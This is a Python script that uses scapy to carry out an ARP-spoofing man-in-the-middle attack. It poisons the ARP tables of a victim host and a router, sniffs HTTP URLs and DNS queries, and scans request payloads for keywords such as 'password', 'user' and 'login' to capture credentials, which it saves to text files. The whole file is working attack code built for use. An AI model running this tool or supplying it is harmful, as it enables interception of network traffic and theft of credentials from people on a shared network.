import scapy.all as scapy
import time
import threading
from scapy.layers import http
import optparse as opt

router = "10.0.2.1"
victim = "10.0.2.15"
http_urls = []
dns_queries = []
passwords = []

opConst = opt.OptionParser()  
opConst.add_option('-r', '--router', dest = "router",default = router) 
opConst.add_option('-v', '--victim', dest = "victim",default = victim) 
oInstance, rInstance = opConst.parse_args() 

router = oInstance.router
victim = oInstance.victim
print("Router--->",router)
print("Victim--->",victim)

def attack_over(dest_ip,src_ip):
        dest_mac = mac(dest_ip)
        src_mac = mac(src_ip)
        packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=src_ip,hwsrc=src_mac)
        scapy.send(packet,verbose=False)
        print("Cleaned Up!")

def mac(ip):
        arp_req = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcasting = broadcast/arp_req
        answered_list = scapy.srp(arp_broadcasting, timeout=1, verbose=False)[0] #only the answered value is needed so [0]
        for i in answered_list:
            return i[1].hwsrc
        
def spoof(target_ip,spoof_ip):
        target_mac = mac(target_ip)
        packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
        scapy.send(packet,verbose=False)

def ARP_Spoof():
    try:
        while 1:
            spoof(victim,router)
            spoof(router,victim)
            time.sleep(1)

    except:
        print("Couldn't Become the Man in the Middle.")
 
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if (packet.haslayer(http.HTTPRequest)):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        try:
            http_urls.append(url.decode('utf-8'))
            print(url.decode('utf-8'))
        except:
            print(url.decode('utf-8'))

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            load = str(load)
            keywords = ["usrname","usr","user","admin","password","pwd","pass","passcode","login"]
            for keyword in keywords:
                if keyword in load:
                    print("Credentials--->",load)
                    passwords.append(load)
    if(packet.haslayer(scapy.DNS)):
        DNS = packet[scapy.DNS]
        query = DNS.qd.qname
        query = query.decode('utf-8')
        print("DNS--->",query)
        file = open('urls.txt','w')
        file.write(query+"\n")
        file.close()

def Sniffer():
    try:
        sniff("eth0")
    except:
        pass

def filewrite():
        file = open('passwords.txt','w')
        for password in passwords:
            file.write(password+"\n")
            file.close()
        
        file = open('passwords.txt','w')
        file.write("Possible http sites:\n")
        for web in http_urls:
            file.write(web)
        
        file = open('urls.txt','w')
        for url in dns_queries:
            file.write(url+"\n")
            file.close()

 
if __name__ =="__main__":
    try:
        t1 = threading.Thread(target=ARP_Spoof)
        t2 = threading.Thread(target=Sniffer)
        t3 = threading.Thread(target=filewrite)
        t1.start()
        t2.start()
        t3.start()
        t1.join()
        t2.join()
        t3.join()
    except KeyboardInterrupt:
        attack_over(victim,router)
        filewrite()
        print(dns_queries)
    except:
        filewrite()
        print(dns_queries)
        pass
    
    